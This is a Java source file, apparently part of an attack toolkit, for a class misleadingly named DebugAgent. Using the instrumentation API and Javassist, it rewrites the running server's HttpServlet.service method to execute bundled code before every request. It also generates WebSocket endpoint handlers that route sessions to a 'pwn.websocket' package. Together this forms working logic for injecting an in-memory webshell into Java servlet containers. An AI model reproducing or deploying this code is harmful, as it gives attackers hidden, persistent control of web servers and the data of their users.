import java.lang.instrument.Instrumentation;
import java.lang.instrument.ClassDefinition;
import java.io.InputStreamReader;
import java.io.Reader;
import java.nio.charset.StandardCharsets;
import java.util.Map;
import java.util.HashMap;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.CtNewMethod;
import javassist.Modifier;
import javassist.bytecode.ConstPool;
import javassist.LoaderClassPath;
import javassist.bytecode.annotation.Annotation;
import javassist.bytecode.AnnotationsAttribute;
import javassist.bytecode.MethodInfo;
import javassist.bytecode.ClassFile;

public class DebugAgent extends Agent {
    public static void install(Instrumentation instrumentation) throws Exception {
        String target = "javax";

        Class clazz = findClass(instrumentation, "javax.servlet.http.HttpServlet");
        if (clazz == null) {
            target = "jakarta";
            clazz = findClass(instrumentation, "jakarta.servlet.http.HttpServlet");
        }

        ClassPool classPool = ClassPool.getDefault();
        classPool.appendClassPath(new LoaderClassPath(clazz.getClassLoader()));
        CtClass cls = classPool.get(clazz.getName());
        cls.defrost();

        String methodName = "service";
        String methodSig = String.format("(L%s/servlet/http/HttpServletRequest;L%s/servlet/http/HttpServletResponse;)V", target, target);
        CtMethod method = cls.getMethod(methodName, methodSig);

        Reader in = new InputStreamReader(DebugAgent.class.getResourceAsStream("/source.java"), StandardCharsets.UTF_8);

        final int bufferSize = 1024;
        final char[] buffer = new char[bufferSize];
        final StringBuilder out = new StringBuilder();
        int charsRead;
        while((charsRead = in.read(buffer, 0, buffer.length)) > 0) {
                out.append(buffer, 0, charsRead);
        }
        String sourceCode = out.toString().replaceAll("PKG", target);

        method.insertBefore(sourceCode);

        byte[] newByteCode = cls.toBytecode();
        ClassDefinition definition = new ClassDefinition(clazz, newByteCode);
        instrumentation.redefineClasses(definition);
    }

    public static Class addAnnotation(Class clazz, String target, Class t) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.appendClassPath(new LoaderClassPath(clazz.getClassLoader()));

        CtClass ctClass = pool.get(clazz.getName());
        ctClass.setName(String.format("%s.websocket.EndpointAnnotated", target));
        ClassFile cf = ctClass.getClassFile();
        ConstPool constpool = cf.getConstPool();

        {
            AnnotationsAttribute attr = new AnnotationsAttribute(constpool, AnnotationsAttribute.visibleTag);
            CtMethod newMethod = CtNewMethod.make(
                    String.format(
                        "public void annotatedOnOpen(%s.websocket.Session s) {  onOpen(pwn.websocket.Session.getInstance(s.getId(), s, s.getBasicRemote())); }",
                        target
                    ),
                    ctClass);
            Annotation annot = new Annotation(String.format("%s.websocket.OnOpen", target), constpool);
            attr.addAnnotation(annot);
            newMethod.getMethodInfo().addAttribute(attr);
            ctClass.addMethod(newMethod);
        }

        {
            AnnotationsAttribute attr = new AnnotationsAttribute(constpool, AnnotationsAttribute.visibleTag);
            CtMethod newMethod = CtNewMethod.make(
                    String.format(
                        "public void annotatedOnMessage(java.nio.ByteBuffer msg, %s.websocket.Session s) {  onMessage(msg, pwn.websocket.Session.getInstance(s.getId(), s, s.getBasicRemote())); }",
                        target
                    ),
                    ctClass);
            Annotation annot = new Annotation(String.format("%s.websocket.OnMessage", target), constpool);
            attr.addAnnotation(annot);
            newMethod.getMethodInfo().addAttribute(attr);
            ctClass.addMethod(newMethod);
        }

        {
            AnnotationsAttribute attr = new AnnotationsAttribute(constpool, AnnotationsAttribute.visibleTag);
            CtMethod newMethod = CtNewMethod.make(
                    String.format(
                        "public void annotatedOnClose(%s.websocket.Session s) {  onClose(pwn.websocket.Session.getInstance(s.getId(), s, s.getBasicRemote())); }",
                        target
                    ),
                    ctClass);
            Annotation annot = new Annotation(String.format("%s.websocket.OnClose", target), constpool);
            attr.addAnnotation(annot);
            newMethod.getMethodInfo().addAttribute(attr);
            ctClass.addMethod(newMethod);
        }

        {
            AnnotationsAttribute attr = new AnnotationsAttribute(constpool, AnnotationsAttribute.visibleTag);
            CtMethod newMethod = CtNewMethod.make(
                    String.format(
                        "public void annotatedOnError(%s.websocket.Session s, java.lang.Throwable t) {  onClose(pwn.websocket.Session.getInstance(s.getId(), s, s.getBasicRemote())); }",
                        target
                    ),
                    ctClass);
            Annotation annot = new Annotation(String.format("%s.websocket.OnError", target), constpool);
            attr.addAnnotation(annot);
            newMethod.getMethodInfo().addAttribute(attr);
            ctClass.addMethod(newMethod);
        }

        return ctClass.toClass(t);
    }

}
